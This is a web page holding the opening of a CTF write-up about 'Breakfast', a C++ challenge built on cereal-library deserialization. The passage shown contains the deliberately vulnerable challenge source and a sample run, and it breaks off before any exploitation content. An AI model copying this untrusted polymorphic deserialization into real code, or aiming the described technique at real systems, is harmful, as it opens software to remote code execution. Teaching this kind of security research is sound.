<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Sharing is Caring: Arbitrary Code Execution for Breakfast - TrebledJ's Pages</title><meta name="description" content="A CTF challenge exploring binary exploitation in C++, gadget mania, and a new form of deserialization attack."><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,sharing is caring: arbitrary code execution for breakfast,a ctf challenge exploring binary exploitation in c++, gadget mania, and a new form of deserialization attack.,ctf,pwn,cpp,infosec,writeup,research"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-puGfk8by7YflxyCkfgS+RgzE70yM3jYq5c5IrWTe0hM=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-fpqHX3vj/TpB8DyMxAUbt+Rpk0g/8oR6BkJd6JriNoo=' 'sha256-J+ryCgKrW+QOH4xdCyPd6R5W3u9wJkXayR7KvtlnCnQ=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' 'unsafe-hashes' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="Sharing is Caring: Arbitrary Code Execution for Breakfast - TrebledJ's Pages"><meta property="twitter:title" content="Sharing is Caring: Arbitrary Code Execution for Breakfast - TrebledJ's Pages"><meta property="og:description" content="A CTF challenge exploring binary exploitation in C++, gadget mania, and a new form of deserialization attack.

Breakfast is a CTF challenge I designed for CrewCTF 2025. With deserialization attacks being in vogue, I wanted to explore the topic in C++ and as a result, found an..."><meta property="twitter:description" content="A CTF challenge exploring binary exploitation in C++, gadget mania, and a new form of deserialization attack.

Breakfast is a CTF challenge I designed for CrewCTF 2025. With deserialization attacks being in vogue, I wanted to explore the topic in C++ and as a result, found an..."><meta property="og:url" content="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp"><meta property="article:published_time" content="2025-10-03T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="cybersecurity"><meta property="article:tag" content="ctf"><meta property="article:tag" content="pwn"><meta property="article:tag" content="cpp"><meta property="article:tag" content="infosec"><meta property="article:tag" content="writeup"><meta property="article:tag" content="research"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-3b2a868570ec062c.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");setMode("dark"===e?"light":"light"===e?"dark":defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/vulnerability-research">CVEs</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li><li class="nav-item"><a class="nav-link" href="/webroll">Webroll</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#the-challenge">The Challenge</a></li><li><a href="#c-internals-redux">C++ Internals Redux</a><ol><li><a href="#what-are-shared-pointers">What are shared pointers?</a></li><li><a href="#what-are-virtual-tables">What are virtual tables?</a></li><li><a href="#what-is-an-std-string">What is an std::string?</a></li></ol></li><li><a href="#analysis">Analysis</a><ol><li><a href="#initial-analysis">Initial Analysis</a></li><li><a href="#type-confusion-primitives">Type Confusion Primitives</a></li></ol></li><li><a href="#exploitation">Exploitation</a><ol><li><a href="#leaking-the-vtable">Leaking the VTable</a></li><li><a href="#arbitrary-memory-read">Arbitrary Memory Read!</a></li><li><a href="#finding-the-heap-address">Finding the Heap Address</a></li><li><a href="#finding-congees-address">Finding Congee's Address</a></li><li><a href="#finding-congees-address-less-hacky-method">Finding Congee's Address: Less Hacky Method</a></li></ol></li><li><a href="#arbitrary-code-execution-ace-via-gadget-chains">Arbitrary Code Execution (ACE) via Gadget Chains</a><ol><li><a href="#pcop-jop">PCOP / JOP</a></li><li><a href="#approach-1-libstdc-and-one-gadget">Approach 1: libstdc++ &amp; One-Gadget</a></li><li><a href="#approach-2-system-bin-sh-gadget-chain">Approach 2: system("/bin/sh") Gadget Chain</a></li></ol></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#solve-script">Solve Script</a></li><li><a href="#flag">Flag</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2025-10-03T08:00:00.000+08:00">2025‑10‑03</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2025-10-07T23:02:33.000+08:00">2025‑10‑07</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">10 minute read</span></div></div><div class="metadata-tag-container"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#the-challenge">The Challenge</a></li><li><a href="#c-internals-redux">C++ Internals Redux</a><ol><li><a href="#what-are-shared-pointers">What are shared pointers?</a></li><li><a href="#what-are-virtual-tables">What are virtual tables?</a></li><li><a href="#what-is-an-std-string">What is an std::string?</a></li></ol></li><li><a href="#analysis">Analysis</a><ol><li><a href="#initial-analysis">Initial Analysis</a></li><li><a href="#type-confusion-primitives">Type Confusion Primitives</a></li></ol></li><li><a href="#exploitation">Exploitation</a><ol><li><a href="#leaking-the-vtable">Leaking the VTable</a></li><li><a href="#arbitrary-memory-read">Arbitrary Memory Read!</a></li><li><a href="#finding-the-heap-address">Finding the Heap Address</a></li><li><a href="#finding-congees-address">Finding Congee's Address</a></li><li><a href="#finding-congees-address-less-hacky-method">Finding Congee's Address: Less Hacky Method</a></li></ol></li><li><a href="#arbitrary-code-execution-ace-via-gadget-chains">Arbitrary Code Execution (ACE) via Gadget Chains</a><ol><li><a href="#pcop-jop">PCOP / JOP</a></li><li><a href="#approach-1-libstdc-and-one-gadget">Approach 1: libstdc++ &amp; One-Gadget</a></li><li><a href="#approach-2-system-bin-sh-gadget-chain">Approach 2: system("/bin/sh") Gadget Chain</a></li></ol></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#solve-script">Solve Script</a></li><li><a href="#flag">Flag</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">Sharing is Caring: Arbitrary Code Execution for Breakfast</h1><p class="post-desc" itemprop="alternativeHeadline">A CTF challenge exploring binary exploitation in C++, gadget mania, and a new form of deserialization attack.</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2025-10-03T08:00:00.000+08:00">2025‑10‑03</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2025-10-07T23:02:33.000+08:00">2025‑10‑07</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">10 minute read</span></div></div><div class="metadata-tag-container"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><p><strong>Breakfast</strong> is a CTF challenge I designed for CrewCTF 2025. With deserialization attacks being in vogue, I wanted to explore the topic in C++ and as a result, found an interesting niche bug in the <a href="https://github.com/USCiLab/cereal" rel="noreferrer" target="_blank">cereal library</a>. In this writeup, we'll revisit C++ internals and explore binary exploitation techniques beyond <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Return-Oriented Programming">ROP</abbr>. We’ll learn how even a properly written C++ program could be vulnerable to remote code execution through insecure deserialization.</p><p>In a future post, I will share a more detailed writeup on the research. But for now, let's have fun and focus on the challenge. :)</p><h2 id="the-challenge" tabindex="-1"><a class="md-anchor" href="#the-challenge" aria-hidden="true"></a> The Challenge</h2><div class="alert alert-info d-flex align-items-start"><i class="fas fa-circle-info ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>The CTF has ended, but the binaries are public! If you want to try solving it or want to follow along, you can grab the challenge distribution pack <a href="https://github.com/Thehackerscrew/2025.crewc.tf/blob/32e7548fb6c25e5511194e75a142fbcc41aebc8f/files/c7db6392685529a5ed8b2cb51fd46184/dist.zip" rel="noreferrer" target="_blank"><em>here</em></a>!</p></div></div><ul><li>Name: Breakfast</li><li>Solves: <a href="https://github.com/Thehackerscrew/2025.crewc.tf/blob/32e7548fb6c25e5511194e75a142fbcc41aebc8f/api/v1/challenges/28/index.json" rel="noreferrer" target="_blank">11</a></li><li>Difficulty: Easy-Medium?</li><li>Description:<blockquote><p>They say breakfast is the most important meal of the day. But sometimes you just need milk to avoid Confusing your favourite Type of cereal…</p></blockquote></li></ul><p>The code is short, but don't let that fool you. A lot of complexity is abstracted away by the <a href="https://github.com/USCiLab/cereal" rel="noreferrer" target="_blank">cereal library</a>.</p><div class="code-toolbar"><pre data-label="breakfast.cpp" class="line-numbers language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cereal/archives/json.hpp&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cereal/types/memory.hpp&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cereal/types/string.hpp&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;memory&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span>

<span class="token keyword">struct</span> <span class="token class-name">Congee</span>
<span class="token punctuation">{</span>
    <span class="token keyword">uint64_t</span> ingredients<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">Archive</span><span class="token operator">&gt;</span>
    <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Archive<span class="token operator">&amp;</span> ar<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">ar</span><span class="token punctuation">(</span><span class="token function">CEREAL_NVP</span><span class="token punctuation">(</span>ingredients<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

    <span class="token keyword">friend</span> std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> os<span class="token punctuation">,</span> <span class="token keyword">const</span> Congee<span class="token operator">&amp;</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> std<span class="token double-colon punctuation">::</span><span class="token function">size</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>ingredients<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            os <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> c<span class="token punctuation">.</span>ingredients<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> os<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">Toast</span>
<span class="token punctuation">{</span>
    <span class="token keyword">uint64_t</span> spread<span class="token punctuation">;</span>

    <span class="token function">Toast</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> spread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">:</span> spread<span class="token punctuation">{</span>spread<span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Mmm- crunchy!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span>

    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">Archive</span><span class="token operator">&gt;</span>
    <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Archive<span class="token operator">&amp;</span> ar<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">ar</span><span class="token punctuation">(</span><span class="token function">CEREAL_NVP</span><span class="token punctuation">(</span>spread<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

    <span class="token keyword">friend</span> std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> os<span class="token punctuation">,</span> <span class="token keyword">const</span> Toast<span class="token operator">&amp;</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> os <span class="token operator">&lt;&lt;</span> t<span class="token punctuation">.</span>spread<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">Fruit</span>
<span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>string name<span class="token punctuation">;</span>
    
    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">Archive</span><span class="token operator">&gt;</span>
    <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Archive<span class="token operator">&amp;</span> ar<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">ar</span><span class="token punctuation">(</span><span class="token function">CEREAL_NVP</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    
    <span class="token keyword">friend</span> std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>ostream<span class="token operator">&amp;</span> os<span class="token punctuation">,</span> <span class="token keyword">const</span> Fruit<span class="token operator">&amp;</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> os <span class="token operator">&lt;&lt;</span> e<span class="token punctuation">.</span>name<span class="token punctuation">;</span>  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Gonna pop to the store to buy some milk for breakfast.\n"</span><span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Keep this data safe for me while I'm gone, alright?\n\n"</span><span class="token punctuation">;</span>

    std<span class="token double-colon punctuation">::</span>stringstream ss<span class="token punctuation">;</span>

    <span class="token punctuation">{</span>
        cereal<span class="token double-colon punctuation">::</span>JSONOutputArchive <span class="token function">archive</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> cereal<span class="token double-colon punctuation">::</span>JSONOutputArchive<span class="token double-colon punctuation">::</span><span class="token class-name">Options</span><span class="token double-colon punctuation">::</span><span class="token function">NoIndent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Congee<span class="token operator">&gt;</span> c <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_shared</span><span class="token generic class-name"><span class="token operator">&lt;</span>Congee<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Toast<span class="token operator">&gt;</span> t <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_shared</span><span class="token generic class-name"><span class="token operator">&lt;</span>Toast<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Toast<span class="token punctuation">{</span><span class="token number">42</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Fruit<span class="token operator">&gt;</span> f <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_shared</span><span class="token generic class-name"><span class="token operator">&lt;</span>Fruit<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>Fruit<span class="token punctuation">{</span><span class="token string">"Apple"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">archive</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> t<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> ss<span class="token punctuation">.</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    s<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token function">remove</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> s <span class="token operator">&lt;&lt;</span> <span class="token string">"\n\n"</span><span class="token punctuation">;</span>

    <span class="token keyword">do</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Remind me of the data again? "</span><span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>string input<span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span><span class="token function">getline</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>

        std<span class="token double-colon punctuation">::</span>stringstream <span class="token function">ss</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cereal<span class="token double-colon punctuation">::</span>JSONInputArchive <span class="token function">archive</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">;</span>

        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Congee<span class="token operator">&gt;</span> c<span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Toast<span class="token operator">&gt;</span> t<span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Fruit<span class="token operator">&gt;</span> f<span class="token punctuation">;</span>
        <span class="token function">archive</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> t<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\nc: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>c <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"t: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>t <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>f <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        t<span class="token operator">-&gt;</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre><div class="toolbar"><div class="toolbar-item"><span>breakfast.cpp</span></div><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>The code first outputs the serialization of three types: <code>Congee</code>, <code>Toast</code>, and <code>Fruit</code>. Then it enters a loop which deserializes input and prints the deserialized values.</p><p>Running it in the terminal:</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" data-output="2-100" tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="$"></span><span></span><span></span><span></span><span></span><span></span><span></span></span><span class="token command">./breakfast</span>
<span class="token output">Gonna pop to the store to buy some milk for breakfast.</span>
<span class="token output">Keep this data safe for me while I'm gone, alright?</span>
<span class="token output"></span>
<span class="token output">{"value0": {"ptr_wrapper": {"id": 2147483649,"data": {"ingredients": {"value0": 0,"value1": 0,"value2": 0,"value3": 0,"value4": 0,"value5": 0,"value6": 0,"value7": 0}}}},"value1": {"polymorphic_id": 1073741824,"ptr_wrapper": {"id": 2147483650,"data": {"spread": 42}}},"value2": {"ptr_wrapper": {"id": 2147483651,"data": {"name": "Apple"}}}}</span>
<span class="token output"></span>
